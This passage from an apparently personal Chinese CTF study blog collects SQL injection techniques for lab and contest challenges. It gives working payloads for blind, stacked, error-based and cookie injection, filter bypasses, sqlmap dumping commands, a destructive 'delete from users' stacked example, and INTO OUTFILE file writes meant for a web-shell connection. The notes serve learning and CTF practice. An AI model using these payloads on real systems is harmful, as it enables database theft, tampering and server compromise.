class="code"><pre><code class="hljs isbl"><span class="hljs-variable"><span class="hljs-keyword">and</span></span> (<span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">length</span></span>(<span class="hljs-title">database</span>())=<span class="hljs-number">8</span>) --</span><br></code></pre></td></tr></table></figure><p>然后通过ascii一个一个猜</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">and (<span class="hljs-name">ascii</span>(<span class="hljs-name">substr</span>(<span class="hljs-name">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=115) -- <br></code></pre></td></tr></table></figure><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>sqli_labs第9关，无论后面的拼接语句正确与否，都返回同样的结果<br>这时就要用到时间盲注，通过sleep()判断是否正确<br>而前面判断单双引号及闭合时，也要通过and sleep(5)判断是否正确<br>简单举例，不赘述</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">and if(<span class="hljs-name">database</span>()=&#x27;security&#x27;,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)-- <br></code></pre></td></tr></table></figure><p>sleep()<br>benchmark(10000000,sha(1))  (约等于3s)</p><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>eg:<br>buuctf: [强网杯 2019]随便注<br>堆叠注入很强大，可以用于执行任何SQL语句。<br>堆叠注入原理<br>就是用’;’把1个语句结束，再用继续输入其他的语句<br>eg:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> =1;delete from <span class="hljs-built_in">users</span>;</span><br></code></pre></td></tr></table></figure><p>堆叠注入的局限性<br>堆叠注入不是任何情况下都能使用的(大多数时候，因为<del>API或数据库引擎的不支持</del>玄学问题，堆叠注入都无法实现)</p><h1 id="exp报错注入-5-5-mysql版本-5-6"><a href="#exp报错注入-5-5-mysql版本-5-6" class="headerlink" title="exp报错注入(5.5&lt; mysql版本&lt; 5.6)"></a>exp报错注入(5.5&lt; mysql版本&lt; 5.6)</h1><p>原理:<br>exp():计算e的x次方的函数，数字太大会产生溢出，在参数&gt;&#x3D;709时报错<br>然后在此条件上进行一些看8懂的奇怪操作，然后payload就有了</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">and</span> (exp(~(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (payload) a)))<br><span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span>(!x-~<span class="hljs-number">0</span>)<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span>(<span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">user</span>())x)a)</span>;<br></code></pre></td></tr></table></figure><p>eg:<br>select * fromusers where and (exp(~(select * from (payload) a)));<br>应用条件<br>5.5&lt; mysql版本&lt; 5.6  (啊这..)</p><h1 id="BIGINT溢出错误"><a href="#BIGINT溢出错误" class="headerlink" title="BIGINT溢出错误"></a>BIGINT溢出错误</h1><p>1个比较详细的<a href="https://cloud.tencent.com/developer/article/1521107">链接</a></p><p>原理:<br>大致就是最大的整数通过计算产生了溢出报错，有了报错，然后你懂的…<br>?id&#x3D;1’ union select (!(select * from (select user())x) - ~0),2,3–+</p><h1 id="NAME-CONST-报错注入"><a href="#NAME-CONST-报错注入" class="headerlink" title="NAME_CONST()报错注入"></a>NAME_CONST()报错注入</h1><p>原理:<br>mysql列名重复会导致报错,通过name_const制造一个列<br>payload:</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">and <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> name_const(payload,<span class="hljs-number">0</span>)) a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> name_const(payload,<span class="hljs-number">0</span>)) b)c)<br></code></pre></td></tr></table></figure><h1 id="主键重复报错"><a href="#主键重复报错" class="headerlink" title="主键重复报错"></a>主键重复报错</h1><p>条件: version&lt; 5.5.53<br>select * from user where id&#x3D;1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</p><h1 id="几何函数报错"><a href="#几何函数报错" class="headerlink" title="几何函数报错"></a>几何函数报错</h1><p>5.7.17 &gt; version &gt; 5.5.47</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">geometrycollection</span>()</span><br><span class="hljs-variable">select</span> * <span class="hljs-variable">from</span> <span class="hljs-variable">user</span> <span class="hljs-variable">where</span> <span class="hljs-variable">id</span>=<span class="hljs-number">1</span> <span class="hljs-variable"><span class="hljs-keyword">and</span></span> <span class="hljs-function"><span class="hljs-title">geometrycollection</span>((<span class="hljs-variable">select</span> * <span class="hljs-title">from</span>(<span class="hljs-variable">select</span> *</span><br><span class="hljs-function"><span class="hljs-title">from</span>(<span class="hljs-variable">select</span> <span class="hljs-title">user</span>())<span class="hljs-variable">a</span>)<span class="hljs-variable">b</span>));</span><br><span class="hljs-function"><span class="hljs-title">multipoint</span>()</span><br><span class="hljs-variable">select</span> * <span class="hljs-variable">from</span> <span class="hljs-variable">test</span> <span class="hljs-variable">where</span> <span class="hljs-variable">id</span>=<span class="hljs-number">1</span> <span class="hljs-variable"><span class="hljs-keyword">and</span></span> <span class="hljs-function"><span class="hljs-title">multipoint</span>((<span class="hljs-variable">select</span> * <span class="hljs-title">from</span>(<span class="hljs-variable">select</span> * <span class="hljs-title">from</span>(<span class="hljs-variable">select</span></span><br><span class="hljs-function"><span class="hljs-title">user</span>())<span class="hljs-variable">a</span>)<span class="hljs-variable">b</span>));</span><br><span class="hljs-function"><span class="hljs-title">polygon</span>()</span><br><span class="hljs-variable">select</span> * <span class="hljs-variable">from</span> <span class="hljs-variable">test</span> <span class="hljs-variable">where</span> <span class="hljs-variable">id</span>=<span class="hljs-number">1</span> <span class="hljs-variable"><span class="hljs-keyword">and</span></span> <span class="hljs-function"><span class="hljs-title">polygon</span>((<span class="hljs-variable">select</span> * <span class="hljs-title">from</span>(<span class="hljs-variable">select</span> * <span class="hljs-title">from</span>(<span class="hljs-variable">select</span></span><br><span class="hljs-function"><span class="hljs-title">user</span>())<span class="hljs-variable">a</span>)<span class="hljs-variable">b</span>));</span><br><span class="hljs-function"><span class="hljs-title">multipolygon</span>()</span><br><span class="hljs-variable">select</span> * <span class="hljs-variable">from</span> <span class="hljs-variable">test</span> <span class="hljs-variable">where</span> <span class="hljs-variable">id</span>=<span class="hljs-number">1</span> <span class="hljs-variable"><span class="hljs-keyword">and</span></span> <span class="hljs-function"><span class="hljs-title">multipolygon</span>((<span class="hljs-variable">select</span> * <span class="hljs-title">from</span>(<span class="hljs-variable">select</span> * <span class="hljs-title">from</span>(<span class="hljs-variable">select</span></span><br><span class="hljs-function"><span class="hljs-title">user</span>())<span class="hljs-variable">a</span>)<span class="hljs-variable">b</span>));</span><br><span class="hljs-function"><span class="hljs-title">linestring</span>()</span><br><span class="hljs-variable">select</span> * <span class="hljs-variable">from</span> <span class="hljs-variable">test</span> <span class="hljs-variable">where</span> <span class="hljs-variable">id</span>=<span class="hljs-number">1</span> <span class="hljs-variable"><span class="hljs-keyword">and</span></span> <span class="hljs-function"><span class="hljs-title">linestring</span>((<span class="hljs-variable">select</span> * <span class="hljs-title">from</span>(<span class="hljs-variable">select</span> * <span class="hljs-title">from</span>(<span class="hljs-variable">select</span></span><br><span class="hljs-function"><span class="hljs-title">user</span>())<span class="hljs-variable">a</span>)<span class="hljs-variable">b</span>));</span><br><span class="hljs-function"><span class="hljs-title">multilinestring</span>()</span><br><span class="hljs-variable">select</span> * <span class="hljs-variable">from</span> <span class="hljs-variable">user</span> <span class="hljs-variable">where</span> <span class="hljs-variable">id</span>=<span class="hljs-number">1</span> <span class="hljs-variable"><span class="hljs-keyword">and</span></span> <span class="hljs-function"><span class="hljs-title">multilinestring</span>((<span class="hljs-variable">select</span> * <span class="hljs-title">from</span>(<span class="hljs-variable">select</span> *</span><br><span class="hljs-function"><span class="hljs-title">from</span>(<span class="hljs-variable">select</span> <span class="hljs-title">user</span>())<span class="hljs-variable">a</span>)<span class="hljs-variable">b</span>));</span><br></code></pre></td></tr></table></figure><h1 id="sql约束攻击"><a href="#sql约束攻击" class="headerlink" title="sql约束攻击"></a>sql约束攻击</h1><p>原理:<br>sql中 insert 和 select 对⻓度和空格的处理⽅式差异造成的漏洞：select 语句对于参数后⾯空格的处理是删除，<br>insert 只是截取最⼤⻓度25的字符串，然后插⼊数据库。<br>假设⼀种情况，⽹⻚输⼊⽤户名，⾸先检查⽤户名是否在数据库中，如果不在就注册为新⽤户</p><ol><li>数据库中存在⼀个管理员 admin</li><li>我们输⼊⼀个⽤户名为 admin+20个空格+1</li><li>检查的时候调⽤ select 语句，空格被删除，剩下了 admin1 ，不在数据库中</li><li>调⽤ insert 注册 admin+20个空格+1 作为新的⽤户 ，这时该⽤户使⽤我们设置的密码</li><li>我们再输⼊ admin 进⾏查询，select 语句就会返回两条数据，⼀条是原本的 admin，另⼀条是被select截取了的admin，第⼆个admin可以匹配我们设置的密码，就可以登陆了</li></ol><p>新版本mysql已经修复 insert 时⾃动截取的问题</p><h1 id="Unicode欺骗-ᴬᴰᴹᴵᴺ"><a href="#Unicode欺骗-ᴬᴰᴹᴵᴺ" class="headerlink" title="Unicode欺骗(ᴬᴰᴹᴵᴺ)"></a>Unicode欺骗(ᴬᴰᴹᴵᴺ)</h1><p>[HCTF 2018]admin，这题简单到侮辱智商，但是wp里的方法还是有必要学习一下</p><p>进入页面，先是注册账户界面(sql注入&#x2F;xxe??)<br>然后注册后发现阔以上传文件(文件上传漏洞?)</p><p>先试试文件上传漏洞:<br>上传成功，但是连8了…..</p><p>试试在登陆界面用sql注入，以及在注册界面试试sql约束攻击<br>还没等试呢，然后在渗透中莫名其妙就出flag了…看了wp才知道，账号admin，密码就是123，在sql注入的时候误输输对了….</p><p>这道题的正常解法有2种</p><h2 id="unicode欺骗"><a href="#unicode欺骗" class="headerlink" title="unicode欺骗"></a>unicode欺骗</h2><p>Unicode欺骗指的是域名中的ASCII字符被替换为Unicode集中的相似字符</p><p>在这道题里，我们阔以注册1个ᴬᴰᴹᴵᴺ用户，然后后台的转化机制是这样的: ᴬᴰᴹᴵᴺ -&gt; ADMIN -&gt; admin<br>然后就阔以用自己的密码登录这个admin辣<br>类似sql约束攻击，网上还有这个漏洞的进阶版: unicode漏洞，看完感觉很流批</p><h1 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h1><p>cookie是什么就8用说了，写在请求里，burp可以随意改，本质上和sql注入木得区别<br>要想了解Cookie注入的成因，必须要了解ASP脚本中的request对象。它被用于从用户那里__获取信息__。<br>Request对象的使用方法一般是这样的：request.[集合名称 ]（参数名称），比如获取从表单中提交的数据时可以这样写：request.form(“参数名称”)，但ASP中规定也可以省略集合名称，直接用这样的方式获取数据：request(“参数名称”)。<br>当使用这样的方式获取数据时，ASP规定是按QueryString、Form、Cookies、ServerVariables的顺序来获取数据的。这样，当我们使用request(“参数名称”)方式获取客户端提交的数据，并且没有对使用request.cookies(“参数名称”)方式提交的数据进行过滤时，Cookie注入就产生了。</p><h2 id="检测是否存在cookie注入"><a href="#检测是否存在cookie注入" class="headerlink" title="检测是否存在cookie注入"></a>检测是否存在cookie注入</h2><p>1.寻找形如“.asp?id&#x3D;xx”类的带参数的URL。   (eg: s&#x2F;hit.asp?id&#x3D;123)<br>2.去掉“id&#x3D;xx”查看页面显示是否正常，如果不正常，说明参数在数据传递中是直接起作用的。<br>3.清空浏览器地址栏，输入“javascript:alert(document.cookie&#x3D;”id&#x3D;”+escape(“xx”));”，按Enter键后弹出一个对话框，内容是“id&#x3D;xx”，然后用原来的URL刷新页面，如果显示正常，说明应用使用Request(“id”)这种方式获取数据的。<br>4.重复上面的步骤，将常规SQL注入中的判断语句带入上面的URL：“javascript:alert(document.cookie&#x3D;”id&#x3D;”+escape(“xx and 1&#x3D;1”));” “javascript:alert(document.cookie&#x3D;”id&#x3D;”+escape(“xx and 1&#x3D;2”));”。和常规SQL注入一样，如果分别返回正常和不正常页面，则说明该应用存在注入漏洞，并可以进行cookie注入<br>5.使用常规注入语句进行注入即可</p><h1 id="sqlmap笔记速查"><a href="#sqlmap笔记速查" class="headerlink" title="sqlmap笔记速查"></a>sqlmap笔记速查</h1><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-number">1</span>.GET参数注入<br>sqlmap -u <span class="hljs-string">&quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;</span><br><span class="hljs-number">2</span>.POST参数注入<br>sqlmap -u <span class="hljs-string">&quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1&quot;</span>  --data<span class="hljs-operator">=</span><span class="hljs-string">&quot;id=1&quot;</span><br></code></pre></td></tr></table></figure><h2 id="一次实战"><a href="#一次实战" class="headerlink" title="一次实战:"></a>一次实战:</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sqlmap -u <span class="hljs-string">&quot;http://114.67.175.224:10497/&quot;</span> <span class="hljs-attribute">--data</span>=<span class="hljs-string">&#x27;id==1&#x27;</span><br><br>[16:53:34] [<span class="hljs-built_in">INFO</span>] resuming back-end DBMS <span class="hljs-string">&#x27;mysql&#x27;</span> <br>[16:53:34] [<span class="hljs-built_in">INFO</span>] testing<span class="hljs-built_in"> connection </span><span class="hljs-keyword">to</span> the target URL<br>web<span class="hljs-built_in"> server </span>operating system: Linux CentOS 6<br>web application technology: Apache 2.2.15, PHP 5.3.3<br>back-end DBMS: MySQL &gt;= 5.0.12<br>[16:53:34] [<span class="hljs-built_in">INFO</span>] fetching current database<br>current database: <span class="hljs-string">&#x27;skctf&#x27;</span>   # 查到数据库<br>[16:53:34] [<span class="hljs-built_in">INFO</span>] fetched data logged <span class="hljs-keyword">to</span> text files under <span class="hljs-string">&#x27;/home/tbmk/.local/share/sqlmap/output/114.67.175.224&#x27;</span><br><br>sqlmap -u <span class="hljs-string">&#x27;http://114.67.175.224:10497/&#x27;</span> <span class="hljs-attribute">--data</span>=<span class="hljs-string">&#x27;id=1&#x27;</span> --current-db   #查询DBMS(数据库管理系统当前数据库)<br><span class="hljs-comment"># 以及还可查询用户: --current-user</span><br><br>sqlmap -u <span class="hljs-string">&#x27;http://114.67.175.224:10497/&#x27;</span> <span class="hljs-attribute">--data</span>=<span class="hljs-string">&#x27;id=1&#x27;</span> -D <span class="hljs-string">&#x27;skctf&#x27;</span> --tables  #查skctf下的所有表<br>sqlmap -u <span class="hljs-string">&#x27;http://114.67.175.224:10497/&#x27;</span> <span class="hljs-attribute">--data</span>=<span class="hljs-string">&#x27;id=1&#x27;</span> -D <span class="hljs-string">&#x27;skctf&#x27;</span> -T <span class="hljs-string">&#x27;fl4g&#x27;</span> --columns #查columns<br>sqlmap -u <span class="hljs-string">&#x27;http://114.67.175.224:10497/&#x27;</span> <span class="hljs-attribute">--data</span>=<span class="hljs-string">&#x27;id=1&#x27;</span> -D <span class="hljs-string">&#x27;skctf&#x27;</span> -T <span class="hljs-string">&#x27;fl4g&#x27;</span> -C <span class="hljs-string">&#x27;skctf_flag&#x27;</span> --dump #查字段的内容<br><br></code></pre></td></tr></table></figure><h1 id="姿势-重命名-预处理语句"><a href="#姿势-重命名-预处理语句" class="headerlink" title="姿势: 重命名&amp;预处理语句"></a>姿势: 重命名&amp;预处理语句</h1><p>[强网杯 2019]随便注，简单的有回显注入<br>考察了堆叠注入，以及你8会的一些sql语法</p><p>然后禁止了一些关键词如select等，然后可以通过一些方法猜出数据库长度、名称，但事实上8用这么麻烦: </p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27;;<span class="hljs-keyword">show</span> databases;<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>可以得到2个表: words和1919810931114514<br>查看words表:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>&#x27; show `<span class="hljs-built_in">words</span>`;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>注意此处words为反勾号(事实上不加也可以)，关于勾号和反勾号再科普一下: linux下不区分，win下区分，勾号用来包含字符串，反勾号用来包含表、数据库、索引等<br>然后获得columns: id、data<br>再查看1919810931114514的columns(注意此处就需要加反勾号了): flag<br>然后就要想办法获取flag字段了</p><h2 id="姿势1-重命名"><a href="#姿势1-重命名" class="headerlink" title="姿势1-重命名"></a>姿势1-重命名</h2><p>未过滤alert、rename，可以进行表、列的修改<br>“因为这里有两张表，回显内容肯定是从word这张表中回显的”<br>那就把1919810931114514改名为words，再把flag改名为id，就阔以查询了<br>payload:</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-number">1</span>&#x27;<span class="hljs-comment">;RENAME TABLE `words` TO `words1`;  </span><br>RENAME TABLE `1919810931114514` TO `words`;<br>ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(<span class="hljs-number">100</span>) CHARACTER SET utf8 COLLATE utf8_general_ci <span class="hljs-literal">NOT</span> NULL<span class="hljs-comment">;</span><br><span class="hljs-title"># character: 字符集, 这段话的意思是:</span> 修改表的字段的字符集<br>show columns from words<span class="hljs-comment">;#</span><br></code></pre></td></tr></table></figure><p>此处第3个语句对column进行改名，如果使用普通的改名语句是8行的比如:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> `table_name` rename <span class="hljs-keyword">column</span> <span class="hljs-string">&#x27;name1&#x27;</span> <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;name2&#x27;</span><br></code></pre></td></tr></table></figure><p>涉及到对字符编码的修改，至于为啥要用utf-8，我也很迷….(那自然是因为用的普遍了)<br>但不修改为啥不行呢? 这是真的8懂</p><p>最后用 1’ or ‘1’&#x3D;’1 就阔以查询得flag了</p><h4 id="修改column的字符集"><a href="#修改column的字符集" class="headerlink" title="修改column的字符集"></a>修改column的字符集</h4><p>eg: 修改表的字段的字符集<br>[字符集 utf8，排序规则 utf8_general_ci]   (collate: 整理)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-keyword">user</span> CHANGE name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci;<br></code></pre></td></tr></table></figure><h2 id="姿势2-预处理语句-char-concat-绕过关键字屏蔽"><a href="#姿势2-预处理语句-char-concat-绕过关键字屏蔽" class="headerlink" title="姿势2-预处理语句 + char() + concat()绕过关键字屏蔽"></a>姿势2-预处理语句 + char() + concat()绕过关键字屏蔽</h2><p>首先扫盲，啥是预处理</p><h3 id="预处理语句使用方式"><a href="#预处理语句使用方式" class="headerlink" title="预处理语句使用方式"></a>预处理语句使用方式</h3><p>所谓预编译语句就是将SQL语句中的值(表名、列名等)用占位符替代，可以视为将 SQL 语句模板化或者说参数化</p><p>定义预处理语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">PREPARE</span> stmt_name <span class="hljs-keyword">FROM</span> preparable_stmt;<br></code></pre></td></tr></table></figure><p>执行预处理语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">EXECUTE</span> stmt_name [<span class="hljs-keyword">USING</span> <span class="hljs-variable">@var_name</span> [, <span class="hljs-variable">@var_name</span>] ...];  <span class="hljs-comment">-- execute: 执行</span><br></code></pre></td></tr></table></figure><p>删除(释放)定义</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DEALLOCATE</span><span class="hljs-operator">|</span><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">PREPARE</span> stmt_name;  <span class="hljs-comment">-- deallocate: 解除分配</span><br></code></pre></td></tr></table></figure><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;;PREPARE jwt from concat(char(<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>), &#x27; * from `<span class="hljs-number">1919810931114514</span>` &#x27;);EXECUTE jwt;#<br></code></pre></td></tr></table></figure><p>卧槽…..这操作…..</p><h2 id="不算方法的姿势-md5闭合sql语句"><a href="#不算方法的姿势-md5闭合sql语句" class="headerlink" title="不算方法的姿势: md5闭合sql语句"></a>不算方法的姿势: md5闭合sql语句</h2><p>算是用来开扩思路的吧<br>[BJDCTF2020 ]Easy MD5 进入页面，发现就一个表单提交窗口，提交了啥也8淦, 也么有提示…这题让我感觉应该做个关于如何在ctf里找hint的总结….总之今天比较眼花，做了几道题都找8到hint</p><p>看了看wp，发现在抓包后返回的response里有hint: Hint: select * from ‘admin’ where password&#x3D;md5($pass,true)<br>混在response头里，就踏马离谱….(真实的渗透怎么会用到这种技巧啊我丢)</p><p>所以，根据这个hint，显然是sql注入，进行构造…..个p，这….能构造吗? 闭合8了啊<br>看wp，发现还真能闭合…..无知限制了我的想象力….(因为8知道md5的值阔以是任何数，以及md5返回的值是二进制流，以及sql的select语句的1个特性…)<br>也就是说如果md5值经过hex转成字符串后为 ‘or’+balabala这样的字符串，则拼接后，当’or’后的语句值为true时，就阔以实现绕过…</p><p>再来看sql语句的1个特性: </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> `admin` <span class="hljs-keyword">where</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">or</span><span class="hljs-string">&#x27;1abcdefg&#x27;</span>    <span class="hljs-comment">---&gt;  True</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> `admin` <span class="hljs-keyword">where</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">or</span><span class="hljs-string">&#x27;0abcdefg&#x27;</span>    <span class="hljs-comment">---&gt;  False</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> `admin` <span class="hljs-keyword">where</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">or</span><span class="hljs-string">&#x27;1&#x27;</span>           <span class="hljs-comment">---&gt;  True</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> `admin` <span class="hljs-keyword">where</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">or</span><span class="hljs-string">&#x27;2&#x27;</span>           <span class="hljs-comment">---&gt;  True</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> `admin` <span class="hljs-keyword">where</span> password<span class="hljs-operator">=</span><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-keyword">or</span><span class="hljs-string">&#x27;0&#x27;</span>           <span class="hljs-comment">---&gt;  False</span><br></code></pre></td></tr></table></figure><p>然后你懂的，网上找1个比较常见的: ‘ffifdyop’，这个字符串被md5加密后就满足’or 1+balabala’的形式，真是骚操作啊，实在么想到</p><h2 id="outfile关键字"><a href="#outfile关键字" class="headerlink" title="outfile关键字"></a>outfile关键字</h2><p>outfile是将检索到的数据，保存到服务器的文件内：<br>格式：select * into outfile “文件地址”<br>eg:</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">mysql&gt; <span class="hljs-keyword">select</span> * <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;f:/mysql/test/one&#x27;</span> <span class="hljs-keyword">from</span> teacher_class;<br></code></pre></td></tr></table></figure><p>然后你生成了文件之后再通netcat或菜刀去连就好<br>(tips:如果你第一次生成了1个文件，第二次写入文件就要换个名字，要不然第一个文件是无法改写的)</p><h2 id="datadir"><a href="#datadir" class="headerlink" title="datadir"></a>datadir</h2><p>datadir是MySQL数据存储位置，是默认的相对位置</p><p>查询时候加上@@ 如@@secure_file_priv、@@datadir<br>eg: </p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">select <span class="hljs-built_in">database</span>(),<span class="hljs-built_in">user</span>() @<span class="hljs-keyword">@datadir</span> into outfile <span class="hljs-string">&#x27;5h1t/t3xt.php&#x27;</span><br></code></pre></td></tr></table></figure><p>把你要爆的信息写入文件，再用netcat、菜刀啦什么的访问</p><h2 id="secure-file-priv"><a href="#secure-file-priv" class="headerlink" title="secure_file_priv"></a>secure_file_priv</h2><p>secure_file_priv 用来限制导出效果。他有三个属性：<br>null: 限制不能导出<br>为空: 可以自定义<br>为路径: 则只能导出到指定路径</p><p>待更</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NCTF,心态裂开</title>
    <link href="/2021/11/28/NCTF-%E5%BF%83%E6%80%81%E8%A3%82%E5%BC%80/"/>
    <url>/2021/11/28/NCTF-%E5%BF%83%E6%80%81%E8%A3%82%E5%BC%80/</url>
    
    <content type="html"><![CDATA[<p>？？既然创建了那就写完<br>这次比赛输出很惨烈，回去再练练吧</p><p>本来2人组了个摆烂队准备签个到，中途加进来了zsky师傅说一起摆，然后大佬出了4个re一血贡献了2000分，俺们两个加起来贡献了400分，俺作为web手输出了个签到呜呜呜</p><p>复盘<br>(<a href="https://ctf.njupt.edu.cn/727.html">官方wp</a>)</p><p>太废物了</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h2><p>payload:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?username[<span class="hljs-number">0</span>]=<span class="hljs-keyword">exp</span>&amp;username[<span class="hljs-number">1</span>]=<span class="hljs-keyword">sleep</span>(<span class="hljs-keyword">if</span>(((<span class="hljs-keyword">substr</span>((<span class="hljs-keyword">select</span>(database())),<span class="hljs-number">11</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&quot;f&quot;</span>)),<span class="hljs-number">10</span>,<span class="hljs-number">0</span>))&amp;username[<span class="hljs-number">2</span>]=<span class="hljs-number">1</span><span class="hljs-keyword">substr</span>((<span class="hljs-keyword">select</span>(database())),<span class="hljs-number">11</span>,<span class="hljs-number">1</span>)=<span class="hljs-string">&quot;f&quot;</span><br></code></pre></td></tr></table></figure><p>脚本:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="Python沙盒绕过"><a href="#Python沙盒绕过" 